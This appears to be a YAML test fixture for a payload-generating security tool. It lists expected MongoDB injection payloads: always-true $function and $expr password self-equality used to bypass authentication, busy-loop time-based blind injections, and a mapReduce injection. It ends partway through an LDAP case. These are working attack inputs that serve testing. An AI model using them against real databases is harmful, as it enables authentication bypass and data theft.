  # ================= NoSQL · 聚合管道 =================

  - name: MongoDB 聚合 $function
    state:
      vuln: nosql
      template: nosql.mongodb.aggregate.function
      outputs: [raw]
    expect:
      payload: '{"$match":{"$expr":{"$function":{"body":"function(){ return true; }","args":[],"lang":"js"}}}}'
      syntax: ok

  - name: MongoDB 聚合 $function 时间盲注
    state:
      vuln: nosql
      template: nosql.mongodb.aggregate.function.sleep
      outputs: [raw]
    expect:
      # `-d<<<ms>>`：前两个 < 是字面量小于号，后两个是占位符边界
      payload: '{"$match":{"$expr":{"$function":{"body":"function(){ var d = new Date(); while (new Date() - d <5000) {} return true; }","args":[],"lang":"js"}}}}'
      syntax: ok

  - name: MongoDB 聚合 $function 时间盲注 · 换阈值
    state:
      vuln: nosql
      template: nosql.mongodb.aggregate.function.sleep
      slots: {ms: "10000"}
      outputs: [raw]
    expect:
      payload: '{"$match":{"$expr":{"$function":{"body":"function(){ var d = new Date(); while (new Date() - d <10000) {} return true; }","args":[],"lang":"js"}}}}'
      syntax: ok

  - name: MongoDB 聚合 $expr 引用字段
    state:
      vuln: nosql
      template: nosql.mongodb.aggregate.expr.field
      outputs: [raw]
    expect:
      # 表达式里的 $password 引用的是文档自己的字段，所以「等于自己」恒真
      payload: '{"$expr":{"$eq":["$password","$password"]}}'
      syntax: ok

  - name: MongoDB 聚合 $expr 引用字段 · 换字段名
    state:
      vuln: nosql
      template: nosql.mongodb.aggregate.expr.field
      slots: {pf: pwd}
      outputs: [raw]
    expect:
      payload: '{"$expr":{"$eq":["$pwd","$pwd"]}}'
      syntax: ok

  - name: MongoDB mapReduce 注入
    state:
      vuln: nosql
      template: nosql.mongodb.mapreduce
      outputs: [raw]
    expect:
      payload: '{"map":"function(){ emit(1, 1); }","reduce":"function(k, v){ return v; }","out":{"inline":1}}'
      syntax: ok

  # ================= LDAP · AD 与过滤器变形 =================

  - name: LDAP AD 按位匹配 userAccountControl
    state:
      vuln: ldap
      template: ldap.generic.ad.bitmask
      outputs: [raw]
    expect:
